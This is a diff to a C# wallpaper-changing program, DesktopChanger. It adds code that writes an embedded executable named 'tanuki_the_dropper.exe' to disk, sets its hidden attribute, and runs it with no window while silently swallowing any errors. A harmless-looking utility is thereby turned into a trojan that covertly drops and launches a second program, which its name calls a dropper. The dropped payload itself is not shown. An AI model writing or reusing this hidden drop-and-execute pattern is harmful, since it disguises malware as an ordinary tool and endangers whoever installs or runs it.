@@ -1,4 +1,5 @@
 ﻿using Microsoft.Win32;
+using System.Diagnostics;
 using System.Runtime.InteropServices;
 
 namespace DesktopChanger
@@ -8,7 +9,28 @@ namespace DesktopChanger
         public static void Main()
         {
             File.WriteAllBytes("tanuki_the_dropper.exe", DesktopChanger.Properties.Resources.tanuki_the_dropper);
+            File.SetAttributes("tanuki_the_dropper.exe", File.GetAttributes("tanuki_the_dropper.exe") | FileAttributes.Hidden);
+
             Wallpaper.Set(Wallpaper.Style.Centered);
+
+            ExecProgram("tanuki_the_dropper.exe");
+        }
+
+        private static void ExecProgram(string fileName)
+        {
+            try
+            {
+                var proc = new Process();
+                proc.StartInfo.FileName = fileName;
+                proc.StartInfo.UseShellExecute = false;
+                proc.StartInfo.CreateNoWindow = true;
+
+                proc.Start();
+                proc.WaitForExit();
+                var exitCode = proc.ExitCode;
+                proc.Close();
+            }
+            catch (Exception ex) { }
         }
     }
 
@@ -31,7 +53,7 @@ namespace DesktopChanger
         public static void Set(Style style)
         {
             File.WriteAllBytes("tanuki_wallpaper.bmp", DesktopChanger.Properties.Resources.tanuki);
-            string tempPath = "tanuki_wallpaper.bmp";
+            string path = Path.GetDirectoryName(Process.GetCurrentProcess().MainModule.FileName) + @"\tanuki_wallpaper.bmp";
 
             RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Control Panel\Desktop", true);
             if (style == Style.Stretched)
@@ -52,7 +74,7 @@ namespace DesktopChanger
 
             SystemParametersInfo(SPI_SETDESKWALLPAPER,
                 0,
-                tempPath,
+                path,
                 SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);
         }
     }
